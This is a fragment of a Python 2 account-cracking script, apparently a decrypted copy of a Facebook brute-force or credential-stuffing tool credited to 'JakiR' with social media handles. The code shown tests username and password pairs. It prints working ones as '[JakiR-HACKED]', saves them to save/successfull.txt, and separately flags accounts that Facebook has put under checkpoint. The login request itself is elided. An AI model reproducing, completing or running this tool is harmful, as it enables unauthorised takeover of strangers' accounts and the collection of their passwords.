# DECRYPTED BY JakiR
# Github : https://github.com/jkjakir2/JakiR
 #!/usr/bin/python
# -*- coding: utf-8
...
def menu():
    ...
    print ''
    print 'AUTHOR   : JakiR'
    print 'FACEBOOK : facebook.com/jkjakir22'
    print 'GITHUB     : github.com/jkjakir2'
    print ''
    print 50* '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[JakiR-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[SR-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[ID OPEN ON 01 DAYS]\x1b[0m \n'
